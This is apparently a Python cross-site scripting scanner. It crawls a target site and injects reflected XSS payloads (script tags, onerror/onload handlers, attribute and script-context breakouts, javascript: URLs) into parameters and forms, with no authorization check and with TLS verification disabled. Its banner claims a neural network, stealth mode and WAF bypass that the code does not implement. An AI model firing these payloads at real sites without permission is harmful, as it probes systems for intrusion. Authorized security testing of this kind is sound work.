#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner - Working Version
Professional XSS Detection Tool with Proper Verification
"""

import requests
import re
import time
import json
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import random
import os
import sys
from datetime import datetime
import hashlib
import argparse
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, timeout=10):
        self.target_url = target_url
        self.max_depth = max_depth
        self.delay = delay
        self.timeout = timeout
        
        # Setup session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Results
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        self.confirmed_targets = set()
        
        # Custom signature
        self.signature = "XSS_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # Payloads
        self.payloads = {
            'html': [
                f'<script>alert("{self.signature}")</script>',
                f'<img src=x onerror=alert("{self.signature}")>',
                f'<svg onload=alert("{self.signature}")>',
            ],
            'attribute': [
                f'"><img src=x onerror=alert("{self.signature}")>',
                f'\'>< img src=x onerror=alert("{self.signature}")>',
                f'" onmouseover="alert(\'{self.signature}\')" "',
            ],
            'javascript': [
                f'\'; alert("{self.signature}"); //',
                f'\"; alert(\'{self.signature}\'); //',
                f'</script><script>alert("{self.signature}")</script>',
            ],
            'url': [
                f'javascript:alert("{self.signature}")',
            ]
        }
        
        # Statistics
        self.stats = {
            'urls_crawled': 0,
            'forms_found': 0,
            'parameters_found': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }

    def print_banner(self):
        """Matrix-style banner"""
        print(f"""
{Fore.GREEN}
╔══════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}██{Fore.GREEN}╗  {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗    {Fore.RED}███████{Fore.GREEN}╗ {Fore.RED}██████{Fore.GREEN}╗ {Fore.RED}█████{Fore.GREEN}╗ {Fore.RED}███{Fore.GREEN}╗   {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗  ║
║  {Fore.RED}╚██╗██╔╝{Fore.GREEN}██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗ ║
║   {Fore.RED}╚███╔╝ {Fore.GREEN}███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝ ║
║   {Fore.RED}██╔██╗ {Fore.GREEN}╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
║  {Fore.RED}██╔╝ ██╗{Fore.GREEN}███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║ ║
║  {Fore.RED}╚═╝  ╚═╝{Fore.GREEN}╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Advanced Cross-Site Scripting Detection Framework     ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Professional Penetration Testing Tool               ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}WAF Bypass • Context-Aware • Verified Results       ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Initializing neural network...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Loading payload database...{Fore.GREEN} DONE  
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Activating stealth mode...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Verification system ready...{Fore.GREEN} ACTIVE
""")

    def test_connectivity(self):
        """Test target connectivity"""
        print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Testing target connectivity...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}CONN{Fore.GREEN}] {Fore.WHITE}Target responded - Status: {response.status_code}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connection failed: {e}")
            return False

    def crawl_target(self):
        """Crawl target"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 1{Fore.GREEN}] {Fore.WHITE}RECONNAISSANCE & TARGET ENUMERATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        urls_to_scan = [self.target_url]
        
        # Add common endpoints
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        common_paths = [
            '/search', '/contact', '/search?q=test', '/?search=test',
            '/artists.php?artist=1', '/listproducts.php?cat=1'
        ]
        
        for path in common_paths:
            urls_to_scan.append(base_url + path)
        
        for url in urls_to_scan[:10]:
            try:
                print(f"{Fore.GREEN}[{Fore.RED}CRAWL{Fore.GREEN}] {Fore.WHITE}Scanning: {url}")
                
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    self.crawled_urls.add(url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, url)
                        if form_data:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}Found: {form_data['action']} ({len(form_data['inputs'])} inputs)")
                    
                    # Extract parameters
                    parsed = urlparse(url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        if url not in self.parameters:
                            self.parameters[url] = {}
                        for param, values in params.items():
                            self.parameters[url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param}")
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}{url}")
        
        # Update stats
        self.stats['urls_crawled'] = len(self.crawled_urls)
        self.stats['forms_found'] = len(self.forms)
        self.stats['parameters_found'] = sum(len(p) for p in self.parameters.values())
        
        print(f"\n{Fore.GREEN}[{Fore.RED}RECON{Fore.GREEN}] {Fore.WHITE}Summary: URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Parameters: {self.stats['parameters_found']}")

    def extract_form_data(self, form, base_url):
        """Extract form data"""
        try:
            action = form.get('action', '') or base_url
            action_url = urljoin(base_url, action)
            method = form.get('method', 'GET').upper()
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name', '')
                if name and input_tag.get('type', '') not in ['submit', 'button']:
                    inputs.append({
                        'name': name,
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
            
            if inputs:
                return {
                    'action': action_url,
                    'method': method,
                    'inputs': inputs,
                    'base_url': base_url
                }
        except:
            pass
        return None

    def test_parameters(self):
        """Test URL parameters"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 2{Fore.GREEN}] {Fore.WHITE}PARAMETER EXPLOITATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        if not self.parameters:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No parameters to test")
            return
        
        for url, params in self.parameters.items():
            for param_name in params:
                target_key = f"{url}#{param_name}"
                
                if target_key in self.confirmed_targets:
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Testing parameter: {param_name}")
                
                # Test until confirmed
                for context, payloads in self.payloads.items():
                    for payload in payloads:
                        if self.test_parameter(url, param_name, payload, context):
                            self.confirmed_targets.add(target_key)
                            print(f"{Fore.GREEN}[{Fore.RED}STOP{Fore.GREEN}] {Fore.WHITE}Confirmed - stopping tests for {param_name}")
                            break
                        time.sleep(self.delay)
                    if target_key in self.confirmed_targets:
                        break

    def test_parameter(self, url, param_name, payload, context):
        """Test parameter"""
        try:
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param_name] = [payload]
            
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            # Make request
            response = self.session.get(test_url, timeout=self.timeout)
            self.stats['payloads_tested'] += 1
            
            # Strong verification
            if self.verify_xss(response, payload, context):
                vuln = {
                    'type': 'Reflected XSS',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': context,
                    'method': 'GET',
                    'score': 20,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                
                self.vulnerabilities.append(vuln)
                self.stats['vulnerabilities_found'] += 1
                
                print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}XSS VULNERABILITY FOUND!")
                print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}{param_name}")
                print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{test_url}")
                print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                print(f"{Fore.GREEN}[{Fore.RED}CONTEXT{Fore.GREEN}] {Fore.WHITE}{context}")
                print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                
                return True
            
            return False
            
        except Exception as e:
            return False

    def verify_xss(self, response, payload, context):
        """Verify XSS with strict checking"""
        try:
            response_text = response.text
            
            # Must contain our signature
            if self.signature not in response_text:
                return False
            
            # Context-specific verification
            if context == 'html':
                # Script tag verification
                if ('<script>' in payload and '<script>' in response_text and 
                    'alert(' in response_text and self.signature in response_text):
                    # Check if script tag is properly formed
                    pattern = rf'<script[^>]*>[^<]*{re.escape(self.signature)}[^<]*</script>'
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
                
                # Event handler verification
                if ('onerror=' in payload and 'onerror=' in response_text):
                    pattern = rf'onerror\s*=\s*[^>]*{re.escape(self.signature)}'
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
                        
            elif context == 'attribute':
                # Attribute breakout verification
                if ('"><' in payload and '"><' in response_text):
                    # Check if we successfully broke out
                    pattern = rf'"[^>]*><[^>]*{re.escape(self.signature)}'
                    if re.search(pattern, response_text):
                        return True
                        
            elif context == 'javascript':
                # JavaScript context verification
                if ('\'; alert(' in payload and '\'; alert(' in response_text):
                    pattern = rf'[\'"];[^<]*{re.escape(self.signature)}'
                    if re.search(pattern, response_text):
                        return True
                        
            elif context == 'url':
                # URL context verification
                if ('javascript:' in payload and 'javascript:' in response_text):
                    pattern = rf'javascript:[^\'">]*{re.escape(self.signature)}'
                    if re.search(pattern, response_text):
                        return True
            
            return False
        except:
            return False

    def test_forms(self):
        """Test forms"""
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Forms...")
        
        if not self.forms:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No forms to test")
            return
        
        for form in self.forms:
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Form: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                input_name = input_field['name']
                target_key = f"{form['action']}#{input_name}"
                
                if target_key in self.confirmed_targets:
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}Testing: {input_name}")
                
                # Test until confirmed
                for context, payloads in self.payloads.items():
                    for payload in payloads:
                        if self.test_form_input(form, input_name, payload, context):
                            self.confirmed_targets.add(target_key)
                            print(f"{Fore.GREEN}[{Fore.RED}STOP{Fore.GREEN}] {Fore.WHITE}Confirmed - stopping tests for {input_name}")
                            break
                        time.sleep(self.delay)
                    if target_key in self.confirmed_targets:
                        break

    def test_form_input(self, form, input_name, payload, context):
        """Test form input"""
        try:
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    if 'email' in input_field['name'].lower():
                        form_data[input_field['name']] = 'test@example.com'
                    else:
                        form_data[input_field['name']] = 'test'
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            self.stats['payloads_tested'] += 1
            
            # Verify XSS
            if self.verify_xss(response, payload, context):
                vuln = {
                    'type': 'Form XSS',
                    'url': form['action'],
                    'parameter': input_name,
                    'payload': payload,
                    'context': context,
                    'method': form['method'],
                    'score': 20,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                
                self.vulnerabilities.append(vuln)
                self.stats['vulnerabilities_found'] += 1
                
                print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}FORM XSS VULNERABILITY!")
                print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}{input_name}")
                print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}{form['action']}")
                print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                print(f"{Fore.GREEN}[{Fore.RED}CONTEXT{Fore.GREEN}] {Fore.WHITE}{context}")
                print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                
                return True
            
            return False
            
        except Exception as e:
            return False

    def generate_reports(self):
        """Generate reports"""
        # HTML Report
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }}
        .header {{ text-align: center; margin-bottom: 30px; }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: rgba(0, 50, 0, 0.5);
            border: 1px solid #00ff00;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }}
        .stat-number {{
            font-size: 2em;
            color: #ff0000;
            font-weight: bold;
        }}
        .vulnerability {{
            background: rgba(50, 0, 0, 0.5);
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }}
        .payload {{
            background: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            margin: 10px 0;
            word-break: break-all;
        }}
        .score {{
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            padding: 8px 15px;
            border-radius: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS SCANNER REPORT</h1>
            <h2>{self.target_url}</h2>
            <p>Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.stats['urls_crawled']}</div>
                <div>URLs Crawled</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['forms_found']}</div>
                <div>Forms Found</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['payloads_tested']}</div>
                <div>Payloads Tested</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['vulnerabilities_found']}</div>
                <div>Vulnerabilities</div>
            </div>
        </div>
        
        <h2>CONFIRMED VULNERABILITIES</h2>
"""
        
        if not self.vulnerabilities:
            html_content += "<p>No confirmed vulnerabilities found.</p>"
        else:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
        <div class="vulnerability">
            <h3>Vulnerability #{i} - {vuln['type']}</h3>
            <p><strong>URL:</strong> {vuln['url']}</p>
            <p><strong>Parameter:</strong> {vuln['parameter']}</p>
            <p><strong>Method:</strong> {vuln['method']}</p>
            <p><strong>Context:</strong> {vuln['context']}</p>
            <p><strong>Score:</strong> <span class="score">{vuln['score']}/20</span></p>
            <p><strong>Payload:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
        </div>
"""
        
        html_content += """
    </div>
</body>
</html>
"""
        
        # Save HTML report
        html_filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        # Save JSON report
        json_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities
        }
        
        json_filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}HTML: {html_filename}")
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}JSON: {json_filename}")
        
        return html_filename, json_filename

    def run_scan(self):
        """Run complete scan"""
        self.print_banner()
        
        try:
            # Test connectivity
            if not self.test_connectivity():
                return
            
            # Phase 1: Crawling
            self.crawl_target()
            
            # Phase 2: Testing
            self.test_parameters()
            self.test_forms()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}GENERATING REPORTS")
            print(f"{Fore.YELLOW}{'='*70}")
            
            html_report, json_report = self.generate_reports()
            
            # Final results
            print(f"\n{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}RESULTS{Fore.GREEN}] {Fore.WHITE}SCAN COMPLETE")
            print(f"{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}{self.target_url}")
            print(f"{Fore.GREEN}[{Fore.RED}STATS{Fore.GREEN}] {Fore.WHITE}Payloads: {self.stats['payloads_tested']} | Vulns: {self.stats['vulnerabilities_found']}")
            
            if self.vulnerabilities:
                print(f"\n{Fore.RED}[{Fore.GREEN}CRITICAL{Fore.RED}] {Fore.WHITE}VULNERABILITIES FOUND:")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    print(f"{Fore.RED}[{i}] {Fore.WHITE}{vuln['type']} in {vuln['parameter']} - {vuln['context']} context")
            else:
                print(f"\n{Fore.GREEN}[{Fore.RED}SECURE{Fore.GREEN}] {Fore.WHITE}No vulnerabilities found")
            
            print(f"\n{Fore.GREEN}[{Fore.RED}FILES{Fore.GREEN}] {Fore.WHITE}Reports: {html_report}, {json_report}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[{Fore.RED}ABORT{Fore.YELLOW}] {Fore.WHITE}Scan interrupted")
        except Exception as e:
            print(f"\n{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Scan failed: {e}")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner - Working Version')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth')
    parser.add_argument('--delay', type=float, default=0.8, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    scanner = XSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        timeout=args.timeout
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()